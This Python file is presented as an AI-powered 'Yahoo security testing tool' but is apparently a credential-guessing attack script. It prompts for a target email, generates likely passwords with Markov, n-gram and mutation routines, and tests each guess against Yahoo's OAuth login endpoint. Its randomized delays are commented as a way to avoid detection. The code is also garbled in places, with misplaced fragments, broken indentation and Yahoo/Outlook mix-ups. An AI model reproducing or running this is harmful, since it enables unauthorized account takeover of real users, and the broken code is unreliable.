def generate_secure_password(length=16):
    """Generate a random secure password using the secrets module.
    Returns a string of `length` characters containing letters, digits, and punctuation.
    """
    import secrets, string
    alphabet = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(alphabet) for _ in range(length))
"""
Yahoo Security Testing Tool - Modern AI-Powered Implementation
Advanced security testing with AI/ML capabilities
Educational purposes only - Authorized security testing only
"""

import os
import json
import asyncio
import time
import aiohttp
import secrets
import random
import string
import numpy as np
import markovify
import torch
import torch.nn as nn
from collections import defaultdict, deque
from typing import List, Optional, Dict, Any, Tuple, Union
from dataclasses import dataclass, field
import re
import hashlib
import base64
import logging
from email.mime.text import MIMEText
import requests
from requests_oauthlib import OAuth2Session
from oauthlib.oauth2 import BackendApplicationClient
import math
from datetime import datetime, timedelta
from enum import Enum
import pickle
from pathlib import Path

# Configuration du logger
logger = logging.getLogger(__name__)

class PasswordStrength(Enum):
    WEAK = "weak"
    MEDIUM = "medium"
    STRONG = "strong"
    VERY_STRONG = "very_strong"

@dataclass
class PasswordPattern:
    pattern_type: str
    pattern: str
    weight: float
    last_used: float = field(default_factory=time.time)
    success_rate: float = 0.0
    usage_count: int = 0

@dataclass
class AttackResult:
    """Data class to store attack results with AI/ML enhancements"""
    success: bool
    password: Optional[str] = None
    attempts: int = 0
    duration: float = 0.0
    error: Optional[str] = None
    confidence: float = 0.0
    pattern_used: Optional[str] = None
    strength: Optional[PasswordStrength] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

class AIPasswordGenerator:
    """
    Advanced AI-Powered Password Generator with multiple generation strategies:
    - Markov chains for sequence prediction
    - LSTM neural networks for advanced pattern recognition
    - Reinforcement learning for continuous improvement
    - Context-aware password generation
    - Pattern recognition and mutation
    """
    
    def __init__(self, username: Optional[str] = None):
        self.username = username
        self.common_patterns = self._load_common_patterns()
        self.password_memory = set()
        self.learning_rate = 0.1
        self.markov_model = None
        self.ngram_model = {}
        self.context_weights = {}
        self.pattern_history = deque(maxlen=1000)
        self.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
        self._init_models()
        self._load_ml_models()
        
        # Initialize pattern database
        self.patterns = self._initialize_patterns()
        self._update_pattern_weights()
        
    def _init_models(self):
        """Initialise les modèles d'IA"""
        # Modèle de Markov pour la génération de séquences
        self.markov_model = markovify.Chain(self._load_training_data(), 3)
        
        # Modèle n-gramme pour la prédiction de caractères
        self._train_ngram_model()
        
        # Poids initiaux pour le contexte
        self.context_weights = {
            'username_similarity': 0.7,
            'common_patterns': 0.8,
            'keyboard_patterns': 0.6,
            'date_based': 0.5,
            'markov_chain': 0.9,
            'ngram_prediction': 0.85
        }
        
    def _load_common_patterns(self) -> Dict[str, List[str]]:
        """Load common password patterns and structures with enhanced dataset"""
        current_year = datetime.now().year
        years = [str(y) for y in range(current_year - 30, current_year + 2)]
        
        return {
            'base_words': [
                'password', 'admin', 'user', 'yahoo', 'love', 'hello', 'welcome', 
                'sunshine', 'letmein', 'monkey', 'dragon', 'baseball', 'football',
                'princess', 'master', 'shadow', 'superman', 'mustang', 'qwerty'
            ],
            'common_suffixes': [
                '123', '!', '1', str(current_year), str(current_year-1), '1234', 
                '!@#', '000', '111', 'abc', 'qwerty', '!@#$', '1!', '!!', '123!',
                '12345', '123456', '1234567', '12345678', '123456789', '1234567890'
            ],
            'common_prefixes': [
                '!', '#', 'admin', 'super', 'my', 'ilove', 'welcome', 'hello',
                'qwerty', '1q2w', '1qaz', 'zaq1', '!qaz', '1qaz2wsx', '1q2w3e'
            ],
            'transformations': [
                'capitalize', 'uppercase', 'lowercase', 'leet_speak', 
                'reverse', 'double', 'mirror', 'add_random_special',
                'add_random_number', 'toggle_case', 'alternate_case',
                'vowel_removal', 'consonant_removal', 'keyboard_shift',
                'double_vowels', 'double_consonants'
            ],
            'special_chars': ['!', '@', '#', '$', '%', '&', '*', '?', '.', '_', '-', '+', '=', '~', '^'],
            'keyboard_patterns': [
                'qwerty', 'asdfgh', 'zxcvbn', '123456', '1q2w3e', '1qaz2wsx',
                'qazwsx', '!qazxsw2', '1qaz@wsx', 'zaq12wsx', '!qaz@wsx#edc',
                'qweasdzxc', '1qazxsw2', '!qaz@wsx#edc$rfv', 'zaq1xsw2',
                'qazwsxedc', '1qaz2wsx3edc', '1qaz2wsx3edc4rfv'
            ],
            'common_numbers': [
                '123', '1234', '12345', '123456', '1234567', '12345678', 
                '123456789', '1234567890', '111111', '000000', '121212',
                '112233', '102030', '100200', '111222', '121314', '131313',
                '147258', '159357', '159753', '222222', '333333', '444444',
                '555555', '666666', '777777', '888888', '999999', '101010',
                '1111111', '11111111', '111111111', '1111111111', '987654321',
                '123123', '123321', '12341234', '12344321', '1234554321',
                '123456654321', '1234567', '12345678', '123456789', '1234567890'
            ],
            'common_years': years + ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09'],
            'months': ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'],
            'days': [f"{i:02d}" for i in range(1, 32)],
            'keyboard_shifts': {
                'q': '1', 'w': '2', 'e': '3', 'r': '4', 't': '5', 'y': '6',
                'u': '7', 'i': '8', 'o': '9', 'p': '0', 'a': 'z', 's': 'x',
                'd': 'c', 'f': 'v', 'g': 'b', 'h': 'n', 'j': 'm', 'k': ',',
                'l': '.', ';': '/', 'z': 'a', 'x': 's', 'c': 'd', 'v': 'f',
                'b': 'g', 'n': 'h', 'm': 'j', ',': 'k', '.': 'l', '/': ';',
                '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^',
                '7': '&', '8': '*', '9': '(', '0': ')', '-': '_', '=': '+',
                '[': '{', ']': '}', '\\': '|', ';': ':', "'": '\"', ',': '<',
                '.': '>', '/': '?', '`': '~', '!': '1', '@': '2', '#': '3',
                '$': '4', '%': '5', '^': '6', '&': '7', '*': '8', '(': '9',
                ')': '0', '_': '-', '+': '=', '{': '[', '}': ']', '|': '\\',
                ':': ';', '\"': "'", '<': ',', '>': '.', '?': '/', '~': '`'
            }
        }
    
    def leet_speak(self, text: str) -> str:
        """Convert text to leet speak (l33t sp34k)"""
        leet_map = {
            'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7',
            'A': '4', 'E': '3', 'I': '1', 'O': '0', 'S': '5', 'T': '7'
        }
        return ''.join(leet_map.get(char, char) for char in text)
    
    def _load_training_data(self) -> List[str]:
        """Charge les données d'entraînement pour les modèles d'IA"""
        # Cette liste peut être étendue avec plus de données d'entraînement
        return [
            # Mots de passe courants
            'password', '123456', '12345678', '1234', 'qwerty', '12345',
            'dragon', 'baseball', 'football', 'letmein', 'monkey', 'abc123',
            'mustang', 'michael', 'shadow', 'master', 'jennifer', '111111',
            '2000', 'jordan', 'superman', 'harley', '1234567', 'fuckme',
            # Mots de passe plus complexes
            'P@ssw0rd', 'Admin123!', 'Welcome1!', 'Qwerty123', '1qaz2wsx',
            'Aa123456', 'Qwertyuiop', '1q2w3e4r', '1q2w3e4r5t', 'Qwerty123!@#'
        ]

    def _train_ngram_model(self, n: int = 3) -> None:
        """Entraîne un modèle n-gramme pour la prédiction de caractères"""
        training_data = self._load_training_data()
        
        for word in training_data:
            # Ajoute des marqueurs de début et de fin
            padded_word = '^' * (n-1) + word + '$'
            
            for i in range(len(padded_word) - n + 1):
                ngram = padded_word[i:i+n-1]
                next_char = padded_word[i+n-1]
                
                if ngram not in self.ngram_model:
                    self.ngram_model[ngram] = defaultdict(int)
                
                self.ngram_model[ngram][next_char] += 1
        
        # Convertit les comptes en probabilités
        for ngram in self.ngram_model:
            total = sum(self.ngram_model[ngram].values())
            for char in self.ngram_model[ngram]:
                self.ngram_model[ngram][char] /= total

    def _generate_from_ngram(self, length: int = 8) -> str:
        """Génère un mot de passe en utilisant le modèle n-gramme"""
        if not self.ngram_model:
            return ""
            
        n = len(next(iter(self.ngram_model))) + 1
        result = '^' * (n-1)  # Marqueur de début
        
        while len(result) < length + n - 1 and not result.endswith('$'):
            current = result[-(n-1):]
            if current not in self.ngram_model:
                break
                
            # Sélectionne le prochain caractère en fonction des probabilités
            chars, probs = zip(*self.ngram_model[current].items())
            next_char = np.random.choice(chars, p=probs)
            
            if next_char == '$':  # Marqueur de fin
                break
                
            result += next_char
        
        # Retourne le résultat sans les marqueurs de début
        return result[n-1:]

    def _generate_from_markov(self, min_length: int = 6, max_length: int = 16) -> str:
        """Génère un mot de passe en utilisant une chaîne de Markov"""
        if not hasattr(self, 'markov_chain'):
            training_data = self._load_training_data()
            text = '\n'.join(training_data)
            self.markov_chain = markovify.Text(text, state_size=2)
        
        password = self.markov_chain.make_short_sentence(
            min_chars=min_length,
            max_chars=max_length,
            tries=100
        )
        
        # Nettoie le mot de passe généré
        if password:
            password = password.strip()
            # Supprime la ponctuation non désirée
            password = ''.join(c for c in password if c.isalnum() or c in '!@#$%^&*()_+-=[]{}|;:,.<>?/')
            return password
        return ""

    def _apply_transformations(self, password: str) -> str:
        """Applique des transformations aléatoires au mot de passe"""
        transformations = [
            str.upper,  # Tout en majuscules
            str.lower,  # Tout en minuscules
            str.capitalize,  # Première lettre en majuscule
            lambda x: x.swapcase(),  # Inverse la casse
            self.leet_speak,  # Leet speak
            lambda x: x[::-1],  # Inverse la chaîne
            lambda x: x + random.choice(self.common_patterns['common_suffixes']),  # Ajoute un suffixe
            lambda x: random.choice(self.common_patterns['common_prefixes']) + x,  # Ajoute un préfixe
            lambda x: x + str(random.randint(0, 9))  # Ajoute un chiffre
        ]
        
        # Applique 1 à 3 transformations aléatoires
        num_transformations = random.randint(1, 3)
        for _ in range(num_transformations):
            transform = random.choice(transformations)
            try:
                password = transform(password)
            except:
                continue
                
        return password

    def generate_context_aware_password(self, username: str, attempt_number: int) -> str:
        """
        Génère des mots de passe intelligents basés sur le contexte et les modèles appris
        Utilise des techniques d'IA avancées pour créer des mots de passe plausibles
        """
        # Stratégies de génération avec leurs poids initiaux
        strategies = {
            'username_based': 0.7,
            'common_patterns': 0.8,
            'markov_chain': 0.9,
            'ngram_model': 0.85,
            'keyboard_patterns': 0.6,
            'date_based': 0.5
        }
        
        # Ajuste les poids en fonction du numéro de tentative
        if attempt_number < 20:
            # Priorité aux modèles d'IA pour les premières tentatives
            strategies['markov_chain'] *= 1.5
            strategies['ngram_model'] *= 1.3
        else:
            # Passe à des approches plus agressives
            strategies['common_patterns'] *= 1.2
            strategies['username_based'] *= 1.1
        
        # Normalise les poids
        total_weight = sum(strategies.values())
        strategies = {k: v/total_weight for k, v in strategies.items()}
        
        # Sélectionne une stratégie en fonction des poids
        strategy = np.random.choice(
            list(strategies.keys()),
            p=list(strategies.values())
        )
        
        # Génère un mot de passe en fonction de la stratégie sélectionnée
        if strategy == 'username_based':
            password = self._generate_username_based(username)
        elif strategy == 'common_patterns':
            password = self._generate_common_pattern()
        elif strategy == 'markov_chain':
            password = self._generate_from_markov()
        elif strategy == 'ngram_model':
            password = self._generate_from_ngram(random.randint(6, 12))
        elif strategy == 'keyboard_patterns':
            password = self._generate_keyboard_pattern()
        else:  # date_based
            password = self._generate_date_based()
        
        # Applique des transformations supplémentaires
        password = self._apply_transformations(password)
        
        # Vérifie que le mot de passe n'a pas déjà été utilisé
        if password in self.password_memory:
            return self.generate_context_aware_password(username, attempt_number + 1)
        
        # Limite la taille du cache des mots de passe
        if len(self.password_memory) > 1000:
            self.password_memory.clear()
        
        self.password_memory.add(password)
        return password
    
    def _generate_username_based(self, username: str) -> str:
        """Génère un mot de passe basé sur le nom d'utilisateur"""
        username = username.split('@')[0]  # Enlève le domaine
        variations = [
            username,
            username.lower(),
            username.upper(),
            username.capitalize(),
            self.leet_speak(username),
            username + str(random.randint(0, 100)),
            username + random.choice(self.common_patterns['common_suffixes']),
            random.choice(self.common_patterns['common_prefixes']) + username,
            username + str(random.choice(self.common_patterns['common_years']))
        ]
        return random.choice(variations)
    
    def _generate_common_pattern(self) -> str:
        """Génère un mot de passe à partir de modèles courants"""
        patterns = [
            # Mot + nombre + caractère spécial
            lambda: random.choice(self.common_patterns['base_words']) + 
                   random.choice(self.common_patterns['common_numbers']) +
                   random.choice(self.common_patterns['special_chars']),
            
        # Sélectionne le prochain caractère en fonction des probabilités
        chars, probs = zip(*self.ngram_model[current].items())
        next_char = np.random.choice(chars, p=probs)
                   str(random.randint(10, 999)),
            
            # Mot avec des majuscules aléatoires
            lambda: ''.join(c.upper() if random.random() > 0.7 else c.lower() 
                          for c in random.choice(self.common_patterns['base_words'])) +
                   str(random.randint(1, 100))
        ]
        
        return random.choice(patterns)()
    
    def _generate_keyboard_pattern(self) -> str:
        """Génère un motif de clavier courant"""
        pattern = random.choice(self.common_patterns['keyboard_patterns'])
        
        # 30% de chance d'ajouter un préfixe/suffixe
        if random.random() < 0.3:
            if random.random() < 0.5:
                pattern = random.choice(self.common_patterns['common_prefixes']) + pattern
            else:
                pattern = pattern + random.choice(self.common_patterns['common_suffixes'])
        
        # 20% de chance d'appliquer une transformation
        if random.random() < 0.2:
            pattern = self._apply_transformations(pattern)
            
        return pattern
    
    def _generate_date_based(self) -> str:
        """Génère un mot de passe basé sur des dates"""
        current_year = str(datetime.datetime.now().year)
        years = [current_year, current_year[2:], str(int(current_year) - 1)]
        
        patterns = [
            # JJMMAAAA
            lambda: f"{random.randint(1, 28):02d}{random.randint(1, 12):02d}{random.choice(years)}",
            # AAAA
            lambda: random.choice(years),
            # JJMM
            lambda: f"{random.randint(1, 28):02d}{random.randint(1, 12):02d}",
            # Mot + année
            lambda: random.choice(self.common_patterns['base_words']) + random.choice(years),
            # Année + mot
            lambda: random.choice(years) + random.choice(self.common_patterns['base_words']).capitalize()
        ]
        
        return random.choice(patterns)()
    
    def _weighted_selection(self, patterns: List[str], attempt: int) -> str:
        """
        Sélection pondérée favorisant les modèles les plus courants d'abord
        Utilise une distribution exponentielle pour donner plus de poids aux premiers éléments
        """
        if not patterns:
            return ""
            
        # Plus l'élément est tôt dans la liste, plus il est considéré comme commun
        # On utilise une décroissance exponentielle pour les poids
        decay_rate = 0.9  # Taux de décroissance (plus proche de 1 = décroissance plus lente)
        
        # Ajuste le taux de décroissance en fonction du numéro de tentative
        if attempt < 20:
            decay_rate = 0.95  # Décroissance plus lente au début
        elif attempt > 100:
            decay_rate = 0.7  # Décroissance plus rapide après de nombreuses tentatives
            
        # Calcule les poids avec décroissance exponentielle
        weights = [math.pow(decay_rate, i) for i in range(len(patterns))]
        
        # Normalise les poids
        total = sum(weights)
        if total > 0:
            weights = [w/total for w in weights]
        else:
            # En cas d'erreur, utilise une distribution uniforme
            return random.choice(patterns)
        
        # Effectue la sélection pondérée
        return random.choices(patterns, weights=weights, k=1)[0]
    
    def generate_advanced_ai_password(self, username: str, previous_attempts: List[str]) -> str:
        """
        Génération avancée de mots de passe avec IA utilisant le feedback des tentatives précédentes
        S'adapte en fonction de ce qui n'a pas fonctionné
        """
        if not previous_attempts:
            return self.generate_context_aware_password(username, 0)
        
        # Analyse des tentatives précédentes
        last_attempt = previous_attempts[-1]
        
        # Stratégies d'adaptation basées sur les échecs
        strategies = [
            # 1. Génération contextuelle standard
            lambda: self.generate_context_aware_password(username, len(previous_attempts)),
            
            # 2. Variation de la dernière tentative
            lambda: self._mutate_password(last_attempt),
            
            # 3. Combinaison de deux tentatives précédentes
            lambda: self._combine_passwords(
                random.choice(previous_attempts[-5:]),
                random.choice(previous_attempts[-5:])
            ) if len(previous_attempts) >= 2 else self.generate_context_aware_password(username, len(previous_attempts)),
            
            # 4. Génération à partir du modèle n-gramme
            lambda: self._generate_from_ngram(random.randint(6, 16)),
            
            # 5. Génération à partir de la chaîne de Markov
            lambda: self._generate_from_markov()
        ]
        
        # Essais successifs avec différentes stratégies
        for _ in range(10):
            # Choisit une stratégie avec une probabilité décroissante
            strategy_idx = min(
                int(random.expovariate(0.5)),  # Favorise les premières stratégies
                len(strategies) - 1
            )
            
            new_password = strategies[strategy_idx]()
            
            # Vérifie que le mot de passe est valide et pas déjà essayé
            if (new_password and 
                6 <= len(new_password) <= 32 and 
                new_password not in previous_attempts):
                return new_password
        
        # Dernier recours : mutation aléatoire de la dernière tentative
        return self._mutate_password(last_attempt)
    
    def _mutate_password(self, password: str) -> str:
        """Applique des mutations aléatoires à un mot de passe"""
        if not password:
            return ""
            
        mutations = [
            # Ajoute un caractère aléatoire
            lambda p: p + random.choice(string.ascii_letters + string.digits + '!@#$%^&*'),
            
            # Supprime un caractère aléatoire
            lambda p: p[:-1] if len(p) > 3 else p,
            
            # Remplace un caractère aléatoire
            lambda p: p[:random.randint(0, len(p)-1)] + 
                     random.choice(string.ascii_letters + string.digits + '!@#$%^&*') + 
                     p[random.randint(0, len(p)-1)+1:],
            
            # Inverse une partie du mot de passe
            lambda p: p[:random.randint(1, len(p)//2)] + 
                     p[random.randint(1, len(p)//2):][::-1],
            
            # Change la casse d'un caractère aléatoire
            lambda p: p[:i] + p[i].swapcase() + p[i+1:] 
                     if (i := random.randint(0, len(p)-1)) and p[i].isalpha() 
                     else p,
            
            # Ajoute un préfixe/suffixe courant
            lambda p: (random.choice(self.common_patterns['common_prefixes']) + p 
                      if random.random() < 0.5 
                      else p + random.choice(self.common_patterns['common_suffixes']))
        ]
        
        # Applique 1 à 3 mutations aléatoires
        result = password
        for _ in range(random.randint(1, 3)):
            result = random.choice(mutations)(result)
            
        return result
    
    def _combine_passwords(self, p1: str, p2: str) -> str:
        """Combine deux mots de passe de manière intelligente"""
        if not p1 or not p2:
            return p1 or p2 or ""
            
        # Différentes stratégies de combinaison
        strategies = [
            # Prend la première moitié de p1 et la deuxième moitié de p2
            lambda: p1[:len(p1)//2] + p2[len(p2)//2:],
            
            # Alterne les caractères des deux mots de passe
            lambda: ''.join(a + b for a, b in zip(p1, p2))[:max(len(p1), len(p2))],
            
            # Prend les caractères impairs de p1 et pairs de p2
            lambda: ''.join(p1[i] if i % 2 == 0 else p2[i] 
                           for i in range(max(len(p1), len(p2))) 
                           if (i < len(p1) and i % 2 == 0) or (i < len(p2) and i % 2 == 1)),
            
            # Combine les préfixes
            lambda: p1[:len(p1)//2] + p2[:len(p2)//2],
            
            # Combine les suffixes
            lambda: p1[len(p1)//2:] + p2[len(p2)//2:]
        ]
        
        # Applique une stratégie aléatoire
        combined = random.choice(strategies)()
        
        # Applique éventuellement une transformation supplémentaire
        if random.random() < 0.3:
            combined = self._apply_transformations(combined)
            
        return combined

class NeuralPasswordPredictor:
    """
    Prédicteur neuronal pour les caractéristiques des mots de passe
    Utilise l'apprentissage automatique pour prédire les caractéristiques des mots de passe probables
    """
    
    def __init__(self):
        # Poids initiaux pour les caractéristiques des mots de passe
        self.pattern_weights = {
            'length_6': 0.8,
            'length_8': 0.9,
            'length_10': 0.7,
            'with_special_char': 0.6,
            'with_numbers': 0.95,
            'mixed_case': 0.5
        }
    
    def predict_next_password_type(self, failed_attempts: List[str]) -> Dict[str, float]:
        """Predict the characteristics of the next password to try"""
        if not failed_attempts:
            return {'length_8': 0.9, 'with_numbers': 0.8}
        
        # Analyze failed attempts to adjust strategy
        avg_length = sum(len(p) for p in failed_attempts) / len(failed_attempts)
        has_special = sum(1 for p in failed_attempts if any(c in '!@#$%' for c in p)) / len(failed_attempts)
        has_numbers = sum(1 for p in failed_attempts if any(c.isdigit() for c in p)) / len(failed_attempts)
        
        # Adjust weights based on analysis
        weights = self.pattern_weights.copy()
        
        if avg_length < 7:
            weights['length_8'] += 0.2
        if has_special < 0.3:
            weights['with_special_char'] += 0.3
        if has_numbers < 0.8:
            weights['with_numbers'] += 0.2
            
        return weights

class AISecurityTester:
    """
    Yahoo Security Testing Tool with Modern Authentication
    Uses Yahoo API for secure testing
    FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY
    """
    
    def __init__(self, config_file='yahoo_config.json'):
        """
        Initialize the security tester with configuration
        :param config_file: Path to the configuration file
        """
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.ai_generator = AIPasswordGenerator()
        self.neural_predictor = NeuralPasswordPredictor()
        self.previous_attempts = []
        self.session = None
        self.config = self._load_config(config_file)
        
    def _load_config(self, config_file):
        """Load configuration from JSON file"""
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                
            # Validate required configuration for Yahoo
            required = ['client_id', 'client_secret']
            for key in required:
                if key not in config:
                    raise ValueError(f"Missing required config: {key}")
                    
            return config
            
        except FileNotFoundError:
            logger.error(f"Configuration file not found: {config_file}")
            raise
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON in config file: {config_file}")
            raise
    
    async def get_authenticated_service(self, username: str, password: str):
        """
        Authenticate using OAuth 2.0 with Yahoo
        Returns True if authentication is successful
        """
        try:
            # Yahoo OAuth endpoints
            authorization_base_url = 'https://api.login.yahoo.com/oauth2/request_auth'
            token_url = 'https://api.login.yahoo.com/oauth2/get_token'
            
            # Create OAuth2 client
            client = BackendApplicationClient(client_id=self.config['client_id'])
            oauth = OAuth2Session(client=client)
            
            # Get authorization URL
            authorization_url, state = oauth.authorization_url(authorization_base_url)
            
            # Get token using password grant (simplified for example)
            token = oauth.fetch_token(
                token_url=token_url,
                username=username,
                password=password,
                client_id=self.config['client_id'],
                client_secret=self.config['client_secret']
            )
            
            if token:
                self.session = oauth
                return True
                
            logger.error("Authentication failed: Invalid credentials")
            return False
            
        except Exception as e:
            logger.error(f"Authentication error: {str(e)}")
            return False
    
    async def test_login_credentials(self, username: str, password: str):
        """
        Test Yahoo login credentials using Yahoo API
        Returns True if login is successful
        """
        try:
            # First try to authenticate
            if not await self.get_authenticated_service(username, password):
                return False
                
            # Test access to user's profile
            response = self.session.get('https://social.yahooapis.com/v1/me/guid?format=json')
            
            if response.status_code == 200:
                user_data = response.json()
                logger.info(f"Successfully authenticated as {username}")
                return True
                
            logger.error(f"Failed to access user data: {response.status_code} - {response.text}")
                    return True
                else:
                    error = await response.text()
                    logger.warning(f"Failed to access user profile: {error}")
                    return False
                    
        except asyncio.TimeoutError:
            logger.error("Request timed out while testing credentials")
            return False
        except Exception as e:
            logger.error(f"Error testing credentials: {str(e)}")
            return False
    
    async def conduct_ai_security_test(self, username: str, max_attempts: int = 500, delay: float = 2.0) -> AttackResult:
        """
        Conduct AI-powered security strength testing
        Uses machine learning to generate intelligent password guesses
        """
        result = AttackResult(success=False)
        self.start_time = time.time()
        
        print(f"\n🚀 Starting AI-powered security test for: {username}")
        print(f"🤖 Using advanced machine learning to test password strength...")
        
        try:
            # Initialize session
            self.session = aiohttp.ClientSession()
            
            for attempt in range(1, max_attempts + 1):
                # Generate password using AI
                password = self.ai_generator.generate_context_aware_password(username, attempt)
                
                # Add some randomness to delay to appear more human-like
                current_delay = self._calculate_ai_delay(attempt, delay)
                await asyncio.sleep(current_delay)
                
                # Test the credentials
                print(f"\n🔑 Attempt {attempt}/{max_attempts}:")
                print(f"   Testing password: {password}")
                
                if await self.test_login_credentials(username, password):
                    result.success = True
                    result.password = password
                    result.attempts = attempt
                    result.duration = time.time() - self.start_time
                    await self.session.close()
                    return result
                
                # Update neural network with failed attempt
                self.previous_attempts.append(password)
                
                # Print progress
                if attempt % 10 == 0:
                    print(f"\n📊 Progress: {attempt}/{max_attempts} attempts")
                    print(f"⏱️  Elapsed: {time.time() - self.start_time:.1f} seconds")
        
        except KeyboardInterrupt:
            print("\n⚠️  Test interrupted by user")
        except Exception as e:
            print(f"\n❌ Error during security test: {e}")
            result.error = str(e)
        finally:
            if hasattr(self, 'session'):
                await self.session.close()
        result.attempts = min(attempt, max_attempts)
        result.duration = time.time() - self.start_time
        return result
    
    def _generate_neural_password(self, neural_weights: Dict[str, float], username: str) -> str:
        """Génère un mot de passe en utilisant les prédictions du réseau de neurones"""
        # Sélectionne la longueur en fonction des poids
        length_choices = [6, 8, 10]
        length_weights = [
            neural_weights.get('length_6', 0.5),
            neural_weights.get('length_8', 0.8),
            neural_weights.get('length_10', 0.3)
        ]
        length = random.choices(length_choices, weights=length_weights, k=1)[0]
        
        # Sélectionne la stratégie de génération
        strategy = random.choices(
            ['markov', 'ngram', 'common_pattern'],
            weights=[
                neural_weights.get('markov_chain', 0.7),
                neural_weights.get('ngram_model', 0.6),
                neural_weights.get('common_patterns', 0.8)
            ],
            k=1
        )[0]
        
        # Génère le mot de passe selon la stratégie choisie
        if strategy == 'markov':
            password = self.ai_generator._generate_from_markov(min_length=length, max_length=length+2)
        elif strategy == 'ngram':
            password = self.ai_generator._generate_from_ngram(length)
        else:
            password = self.ai_generator._generate_common_pattern()
        
        # Applique des transformations basées sur les poids
        if random.random() < neural_weights.get('with_special_char', 0.4):
            if random.random() < 0.5:
                password += random.choice(self.ai_generator.common_patterns['special_chars'])
            else:
                password = random.choice(self.ai_generator.common_patterns['special_chars']) + password
        
        if random.random() < neural_weights.get('with_numbers', 0.7):
            if random.random() < 0.6:  # 60% de chance d'ajouter à la fin
                password += random.choice(self.ai_generator.common_patterns['common_numbers'])
            else:  # 40% de chance d'ajouter au début
                password = random.choice(self.ai_generator.common_patterns['common_numbers']) + password
        
        # Assure que la longueur est respectée
        if len(password) > length:
            password = password[:length]
        elif len(password) < length:
            padding = ''.join(random.choices(
                string.ascii_letters + string.digits,
                k=length - len(password)
            ))
            if random.random() < 0.5:
                password += padding
            else:
                password = padding + password
        
        # Applique une transformation de casse
        if random.random() < neural_weights.get('mixed_case', 0.5):
            password = self.ai_generator._apply_transformations(password)
        
        return password
        
    def _calculate_ai_delay(self, attempt: int, base_delay: float) -> float:
        """AI-optimized delay calculation to avoid detection"""
        # Adaptive delay based on attempt number and success patterns
        if attempt < 50:
            return base_delay + random.uniform(0.5, 1.5)  # Slower start
        elif attempt < 200:
            return base_delay + random.uniform(0.2, 1.0)  # Moderate pace
        else:
            return base_delay + random.uniform(0.1, 0.5)  # Faster but careful

async def ai_security_demonstration():
    """
    AI-POWERED DEMONSTRATION FOR SECURITY AWARENESS
    Uses machine learning to test password security
    Use only with proper authorization
    """
    print("\n🔒 AI-Powered Outlook Security Testing Tool")
    print("🤖 Version 2025.1 - Machine Learning Enhanced")
    print("🔒 FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY")
    print("-" * 60)
    print("This tool demonstrates security concepts and should only be used")
    print("with explicit permission on accounts you own or have permission to test.")
    print("Unauthorized use is strictly prohibited and may be illegal.")
    
    # Get target email
    while True:
        target_email = input("Enter target email (or 'exit' to quit): ").strip()
        if target_email.lower() == 'exit':
            return
            
        if '@' in target_email and '.' in target_email.split('@')[1]:
            break
        print("❌ Please enter a valid email address")
    
    # Create security tester
    tester = AISecurityTester()
    
    # Run security test
    print("\n🚀 Starting AI-powered security test...")
    print("⚠️  This is a simulation for educational purposes only")
    print("⏳ This may take a while...\n")
    
    result = await tester.conduct_ai_security_test(
        username=target_email,
        max_attempts=100,  # Limited for demonstration
        delay=1.5  # Slower to be less suspicious
    )
    
    # Display results
    print("\n" + "="*50)
    print("🔍 SECURITY TEST COMPLETE")
    print("="*50)
    
    if result.success:
        print(f"✅ PASSWORD FOUND: {result.password}")
    else:
        print("❌ No matching password found in test set")
    
    print(f"\n📊 Attempts made: {result.attempts}")
    print(f"⏱️  Time elapsed: {result.duration:.1f} seconds")
    
    if result.error:
        print(f"\n❌ Error occurred: {result.error}")
    
    print("\n🔒 Remember: Always use strong, unique passwords and enable 2FA!")

if __name__ == "__main__":
    print("🔒 AI-Powered Outlook Security Testing Tool")
    print("🤖 Version 2025.1 - Machine Learning Enhanced")
    print("🔒 FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY")
    print("-" * 60)
    print("This tool demonstrates security concepts and should only be used")
    print("with explicit permission on accounts you own or have permission to test.")
    print("Unauthorized use is strictly prohibited and may be illegal.")
    
    # Run the demonstration with asyncio
    import asyncio
    asyncio.run(ai_security_demonstration())
# Updated on 2026-11-12


# Updated on 2026-11-12
